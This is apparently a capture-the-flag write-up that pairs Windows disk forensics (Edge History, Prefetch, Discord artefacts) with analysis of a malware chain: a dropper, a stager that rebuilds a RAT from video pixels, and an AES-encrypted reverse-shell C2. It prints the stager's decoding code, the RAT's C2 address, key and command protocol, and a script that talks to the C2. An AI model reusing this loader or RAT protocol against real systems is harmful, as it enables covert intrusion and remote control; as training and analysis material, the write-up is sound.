# PixelPerfect

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | Rooted 2026 / CaliphAllabs     |
| Category    | forensics / reversing          |
| Difficulty  | Hard                           |
| Author      | CaliphAllabs                   |

## Description
Mi primo pequeño está obsesionado con el speedrunning de Super Mario Bros de la NES. Empezó recientemente por ver a algunos creadores que seguía en Twitch y ahora no quiere dejar de jugar. Tras uno de sus enfados habituales por no conseguir hacer correctamente el "flagpole glitch", su ordenador empezó a hacer cosas raras. Tengo algunos archivos de su disco duro, veamos qué ha estado haciendo.

nc challs.caliphallabs.com 53109

## TL;DR
**Two flags.** The challenge has two parts: (1) Windows disk forensics - answer 12 questions about user activity by analyzing Edge History, Prefetch, Discord data, etc. (2) Malware analysis - analyze the infection chain `installer.exe` → `Stager.exe` (PyInstaller) → `video.mp4` (steganography) → `mario.exe` (RAT with AES-CBC C2), connect to the C2 impersonating the RAT to obtain the second flag.

## Initial Analysis

### Contents of Perfect_Pixel.zip
```
C/
├── Users/nofts/
│   ├── Desktop/Nestopia140bin/        # NES emulator + malware
│   │   ├── nestopia.exe               # Nestopia 1.40
│   │   ├── nestopia.xml               # Config (version 1.40)
│   │   ├── nestopia.log               # Execution log
│   │   ├── cheats/installer.exe       # MALWARE (94 MB)
│   │   └── screenshots/
│   │       └── Super Mario Bros. (World)_001.png  # GAME OVER in World 4-1
│   ├── AppData/Local/
│   │   ├── Microsoft/Edge/User Data/Default/History  # SQLite - browser history
│   │   └── ConnectedDevicesPlatform/.../ActivitiesCache.db  # App execution
│   └── AppData/Roaming/discord/
│       ├── Local Storage/leveldb/     # Discord user data
│       ├── logs/renderer_js.log       # Route transitions
│       └── sentry/scope_v3.json       # User identity
└── Windows/Prefetch/
    ├── NESTOPIA.EXE-CF5393AE.pf       # 3 runs
    └── INSTALLER.EXE-D2A4CE09.pf      # 1 run
```

## Part 1: Forensic Quiz (12 questions)

### Reconstructed Timeline (2026-02-24 UTC)

| UTC Time | Event | Source |
|----------|-------|--------|
| 00:40:58 | First activity in Edge | Edge History |
| 00:41:03 | First search: **niftski** | keyword_search_terms |
| 00:41:19 | Watches Niftski video on YouTube (SMB speedrun) | urls |
| 00:43:24 | Searches "nestopia emulator" | keyword_search_terms |
| 00:43:50 | **Downloads Nestopia140bin.zip** (1.2 MB, SourceForge) | downloads |
| **00:44:16** | **First execution of Nestopia** | Prefetch (pyscca) |
| 00:44:33 | Searches for Mario Bros ROM | keyword_search_terms |
| 00:44:52 | Downloads OperaGXSetup.exe (adware redirect) | downloads |
| 00:45:38 | Downloads Super Mario Bros. (World).zip (ROM) | downloads |
| 00:46:04 | Second execution of Nestopia | Prefetch |
| 00:47:41 | Searches "como se salta en nestopia mario bros" | keyword_search_terms |
| 00:51:55 | Searches "speedrun mario bro" | keyword_search_terms |
| 00:57:51 | Accesses suspicious Google Drive folder | urls |
| 00:59:23 | Views installer.exe page on Google Drive | urls |
| 00:59:38 | **Downloads installer.exe** (94 MB, Google Drive) | downloads |
| **01:00:43** | **Executes installer.exe** (MALWARE) | Prefetch |
| 01:15:55 | Searches "discord" | keyword_search_terms |
| 01:16:06 | **Downloads Discord** | downloads |
| 01:16:49 | Third execution of Nestopia | Prefetch |
| 01:20:39 | Registers Discord account as **noftski** | urls |
| 01:22:17 | Joins server via invite **KjAV9Xa** | urls |
| 01:49:36 | Searches "ftk imager" (tries to investigate the infection) | keyword_search_terms |
| 01:52:49 | Downloads FTK Imager 8.2.0 | downloads |

### Q1: System username
```
nofts
```
**Source:** Profile path `C/Users/nofts/`

### Q2: First internet search
```
niftski
```
**Source:** Edge History → `keyword_search_terms` table, first entry by `last_visit_time`
```sql
SELECT datetime((ut.last_visit_time/1000000)-11644473600, 'unixepoch'), kst.term
FROM keyword_search_terms kst JOIN urls ut ON kst.url_id = ut.id
ORDER BY ut.last_visit_time LIMIT 1;
-- 2026-02-24 00:41:06 | niftski
```

### Q3: First downloaded file
```
Nestopia140bin.zip
```
**Source:** Edge History → `downloads` table, first entry
```sql
SELECT datetime((start_time/1000000)-11644473600, 'unixepoch'), target_path
FROM downloads ORDER BY start_time LIMIT 1;
-- 2026-02-24 00:43:50 | C:\Users\nofts\Downloads\Nestopia140bin.zip
```

### Q4: First emulator execution
```
2026-02-24 00:44:16 GMT
```
**Source:** Windows Prefetch file `NESTOPIA.EXE-CF5393AE.pf` parsed with `pyscca`:
```python
import pyscca, datetime
pf = pyscca.file()
pf.open("extracted/C/Windows/Prefetch/NESTOPIA.EXE-CF5393AE.pf")
# run_count = 3
# Last run times (most recent first):
#   2026-02-24 01:16:49 UTC
#   2026-02-24 00:46:04 UTC
#   2026-02-24 00:44:16 UTC  ← first execution
```
Win10 Prefetch uses MAM compression (LZXPRESS Huffman). The `python3-libscca` package (`pyscca` module) handles decompression natively on Linux.

### Q5: Emulator version
```
1.40
```
**Source:** `nestopia.xml` version attribute, confirmed in `nestopia.log`:
```
Nestopia log file version 1.40
```

### Q6: Message in the screenshot
```
GAME OVER
```
**Source:** `screenshots/Super Mario Bros. (World)_001.png` shows a NES screen with "GAME OVER" in World 4-1, score 027450.

### Q7: Binary downloaded after the frustration
```
installer.exe
```
**Source:** Edge downloads table. After the GAME OVER, the user searches for help and ends up downloading `installer.exe` (94 MB) from Google Drive:
- **Folder ID:** `1SGFfx-J7UumUtvT6nQIKSl6tRLlpC-XJ`
- **File ID:** `1przVUS6mag5Usk4HGAFlEJloS34QQUhd`
- Download: 00:59:38 → 01:00:18 UTC

### Q8: Application downloaded afterwards
```
Discord
```
**Source:** `DiscordSetup.exe` downloaded at 01:16:06 from discord.com.

### Q9: Real name the user wanted to use
```
noftski
```
**Source:** Discord LevelDB Local Storage (`000005.ldb`), `MultiAccountStore` entry:
```json
{"id":"1475662519434739935","avatar":null,"username":"noftski","discriminator":"0"}
```
Confirmed in `sentry/scope_v3.json` with email `noftski@outlook.com`. The system username "nofts" was a typo - they wanted to be "noftski" (imitating "niftski").

### Q10: Number of Discord servers
```
2
```
**Source:** `discord/logs/renderer_js.log` - route transitions with pattern `/channels/{guild_id}/{channel_id}`:
```
[2026-02-24 02:22:26.576] transitionTo - /channels/599131748143464459/599131748143464461
[2026-02-24 02:39:17.688] transitionTo - /channels/1475665918297374916/1475665918297374919
```

### Q11: Server IDs (smallest to largest)
```
599131748143464459,1475665918297374916
```
**Source:** Same guild IDs from the previous `renderer_js.log`.

### Q12: Server with many members
```
Super Mario Speedrunning (8-bit)
```
**Source:** Public Discord API, resolving the invite `KjAV9Xa` found in Edge History:
```bash
curl -s "https://discord.com/api/v10/invites/KjAV9Xa" | jq '.guild.name'
# "Super Mario Speedrunning (8-bit)"
```
Corresponds to guild ID `599131748143464459`.

### Flag 1
```
clctf{n0ftsk1_15_4_n1fTsk1_w4Nn4_B3}
```

---

## Part 2: Malware Analysis (installer.exe → flag)

### Infection Chain

```
installer.exe (94 MB, PE32+ console x86-64)
    │
    ├─ [1] Downloads video.mp4 from C2
    │      URL: http://pixel-perfect.challs.caliphallabs.com/uploads/video.mp4
    │      Saved as: Pixel_Perfect_Video.mp4
    │
    ├─ [2] Extracts Stager.exe (embedded in base64 at offset 0xb9a59)
    │      70 MB, PE32+ GUI x86-64 - PyInstaller bundle (Python 3.13)
    │
    └─ [3] Executes mario.exe (via os.startfile)
            Generated by Stager.exe from video.mp4

Stager.exe (PyInstaller, Python 3.13)
    │
    └─ stager.py: Reads video.mp4, extracts bits from frames, generates mario.exe
       - 35 frames of 1920x1080
       - Grid of 256x270 blocks per frame
       - Each block = 1 bit (dark=1, light=0)
       - 4,536,000 bits → 567,000 bytes = mario.exe

mario.exe (567 KB, PE32+ console x86-64 - C++ RAT)
    │
    └─ Reverse shell with AES-128-CBC over TCP
       - C2 IP:   185.234.69.58
       - C2 Port: 12732 (0x31bc)
       - AES Key: pixelcodepixelco
       - UUID:    54643474-a769-417e-9a71-8be2f604ffe9
       - Protocol: 4-byte big-endian length prefix + AES(IV + CBC(padded_data))
       - Commands: ping/pong, exit/quit, cmd.exe /c <command>, CD <path>
       - Kill switch: if it receives a command containing "clctf{", exits the RAT
```

###  Analysis of installer.exe

```bash
$ file installer.exe
PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections

$ sha256sum installer.exe
c17061619134a2d975df8042a34fa5560022602c893159b66a7b706b352bff00

# Key strings (wide/UTF-16LE):
$ strings -el installer.exe | grep -i "http\|video\|stager\|mario"
Started downloading ->
Successfully read -> Stager.exe
Successfully opened -> mario.exe
http://pixel-perfect.challs.caliphallabs.com/uploads/video.mp4
Pixel_Perfect_Video.mp4
```

Behavior: downloads `video.mp4` from the C2, internally reads `Stager.exe` (embedded base64), and executes `mario.exe`.

###  Extraction of Stager.exe

PE embedded in base64 within the binary at offset `0xb9a59`:
```python
import base64
with open('installer.exe', 'rb') as f:
    data = f.read()
# Base64 blob: 0xb9a59 → 0x59e4022 (93,496,776 chars)
b64 = data[0xb9a59:0x59e4022]
stager = base64.b64decode(b64)  # 70,122,580 bytes
# file: PE32+ executable (GUI) x86-64, for MS Windows
```

###  Decompilation of Stager.exe (PyInstaller)

```bash
$ python3 pyinstxtractor.py stager.exe
[+] Python version: 3.13
[+] Found 1303 files in CArchive
[+] Possible entry point: stager.pyc

# Python 3.13 bytecode - decompilers don't support it, we use dis:
$ python3 -c "import dis, marshal; ... dis.dis(code)"
```

The bytecode reveals the logic of `stager.py`:

```python
# Reconstructed from Python 3.13 bytecode
import imageio, numpy as np, os

def frames_to_bits_auto(frames):
    """Each frame is divided into blocks. Dark block (<128) = bit 1."""
    bits_list = []
    for frame in frames:
        gray = np.mean(frame, axis=2)
        h, w = gray.shape
        pixel_size = min(max(1, h // 256), max(1, w // 256))  # ~4px per block
        h_blocks, w_blocks = h // pixel_size, w // pixel_size  # 270x480 blocks
        cropped = gray[:h_blocks*pixel_size, :w_blocks*pixel_size]
        reshaped = cropped.reshape(h_blocks, pixel_size, w_blocks, pixel_size)
        block_means = reshaped.mean(axis=(1, 3))
        block_bits = (block_means < 128).astype(np.uint8)
        bits_list.append(block_bits.ravel())
    return np.concatenate(bits_list)

def bits_to_file(bits, output_file):
    """Packs bits into bytes and writes file."""
    packed = np.packbits(bits[:bits.size - bits.size % 8], bitorder='big')
    with open(output_file, 'wb') as f:
        f.write(packed.tobytes())

def video_to_exe(video_path, output_name="mario.exe"):
    reader = imageio.get_reader(video_path, 'ffmpeg')
    frames = list(reader)
    reader.close()
    bits = frames_to_bits_auto(frames)
    return bits_to_file(bits, output_name)

if __name__ == "__main__":
    video_to_exe("Pixel_Perfect_Video.mp4", "mario.exe")
```

###  Extraction of mario.exe from video.mp4

```bash
$ curl -sO http://pixel-perfect.challs.caliphallabs.com/uploads/video.mp4
$ python3 extract_mario.py video.mp4 mario.exe
[*] Read 35 frames (1080, 1920, 3)
[*] Extracted 567000 bytes
[*] PE header: True

$ file mario.exe
PE32+ executable (console) x86-64, for MS Windows
```

The 1.46-second video encodes a complete 567 KB executable in its pixels.

###  Reversing mario.exe (RAT C2)

```bash
$ strings mario.exe | grep -i "pixel\|key\|http\|cmd\|aes\|ping"
pixelcodepixelco                    # AES-128 key (16 bytes)
Key must be 16, 24, or 32 bytes long
185.234.69.58                       # C2 IP
ping / pong / exit / quit           # Control commands
clctf{                              # Kill switch string
cmd.exe /c                          # Command execution
powershell.exe -NoProfile ...       # PowerShell execution

$ strings mario.exe | grep "54643474"
54643474-a769-417e-9a71-8be2f604ffe9   # Registration UUID
```

Analysis with radare2:
```
# Hardcoded port:
mov ecx, 0x31bc        ; port = 12732
call htons

# IP:
lea rdx, "185.234.69.58"
call inet_pton

# AES key → KeyExpansion:
lea rdx, "pixelcodepixelco"
call KeyExpansion

# Registration: sends encrypted UUID as first message
lea rdx, "54643474-a769-417e-9a71-8be2f604ffe9"
call AESCipherTCP::encrypt
call send_data

# Command loop:
call recv_data → AESCipherTCP::decrypt
  if "ping" → encrypt("pong") → send_data
  if "exit"/"quit" → closesocket + reconnect
  if contains "clctf{" → exit RAT (kill switch)
  else → execute_command (cmd.exe /c) → encrypt(output) → send_data
```

**Network protocol:**
- Framing: `[4 bytes big-endian length][payload]`
- Payload: `[16 bytes IV][AES-CBC-128 encrypted, PKCS7 padded]`
- Key: `pixelcodepixelco` (constant)

###  Connecting to the C2 to obtain the flag

```python
# solve_malware.py (simplified)
sock.connect(('185.234.69.58', 12732))

# 1. Register with encrypted UUID
send_data(sock, aes_encrypt(UUID, KEY))

# 2. C2 sends "ping" → we respond "pong"
cmd = aes_decrypt(recv_data(sock), KEY)  # b'ping'
send_data(sock, aes_encrypt(b'pong', KEY))

# 3. C2 sends the flag
cmd = aes_decrypt(recv_data(sock), KEY)  # b'clctf{p1X3L_c0D3_C2_1n_Y0u7Ub3}'
```

```
$ python3 solve_malware.py
[*] Connecting to C2 at 185.234.69.58:12732
[+] Connected!
[*] Sent UUID registration
[C2 #0] Received: 'ping'
[*] Replied: pong
[C2 #1] Received: 'clctf{p1X3L_c0D3_C2_1n_Y0u7Ub3}'

[+] FLAG: clctf{p1X3L_c0D3_C2_1n_Y0u7Ub3}
```

## Execution

```bash
# Flag 1 - Forensic quiz
python3 solve.py

# Flag 2 - Malware C2
python3 solve_malware.py

# mario.exe extraction (auxiliary)
python3 extract_mario.py video.mp4 mario.exe
```

## Discarded Approaches
- **Direct strings/grep on installer.exe:** The flag is not embedded, it is obtained from the C2 at runtime
- **Analysis of video.mp4 as a video:** The video looks like visual noise/corruption but is actually binary steganography
- **EXIF/metadata from the screenshot:** No useful data beyond the timestamp
- **Decompilation of stager.pyc:** Python 3.13 not supported by decompyle3/uncompyle6, `dis` was used to disassemble bytecode instead
- **windowsprefetch on Linux:** The module requires `ctypes.windll` (Windows only), `pyscca` (libscca) was used instead
- **Searching for flag as string in mario.exe:** `clctf{` appears but as a kill switch string, not as the complete flag

## Flag 1
```
clctf{n0ftsk1_15_4_n1fTsk1_w4Nn4_B3}
```

## Flag 2
```
clctf{p1X3L_c0D3_C2_1n_Y0u7Ub3}
```

## Key Lessons
- Windows 10 Prefetch files use MAM compression and require `pyscca` (not manual parsers) on Linux
- Discord `renderer_js.log` records route transitions including guild/channel IDs
- Discord LevelDB Local Storage contains `MultiAccountStore` with the user's username and ID
- PyInstaller bundles for Python 3.13 cannot be decompiled with current tools, but `dis` + `marshal` allow reconstructing the logic
- Video steganography (bits encoded as pixel blocks) is a real exfiltration vector
- RATs with AES-CBC over TCP can be impersonated if the key is extracted from the binary
- A 94 MB binary can contain a 70 MB PE in base64, which in turn generates a 567 KB RAT from a 1.4 MB video

## File Structure

```
PixelPerfect/
├── solution.md          # This writeup
├── solve.py             # Quiz solver (flag 1)
├── solve_malware.py     # C2 solver (flag 2)
├── extract_mario.py     # mario.exe extractor from video.mp4
├── README.TXT           # Challenge description
├── Perfect_Pixel.zip    # Original disk image
└── extracted/           # Files extracted from the ZIP
```

## References
- Windows Prefetch: MAM compression (LZXPRESS Huffman), stored up to 8 last run timestamps
- libscca/pyscca: https://github.com/libyal/libscca
- PyInstaller extraction: https://github.com/extremecoders-re/pyinstxtractor
- AES-CBC: IV prepended to ciphertext, PKCS7 padding
- Discord forensics: LevelDB Local Storage, renderer_js.log, sentry/scope_v3.json
- Edge/Chromium History: SQLite DB with tables `urls`, `downloads`, `keyword_search_terms`
- Malicious-PixelCode: https://github.com/S3N4T0R-0X0/Malicious-PixelCode
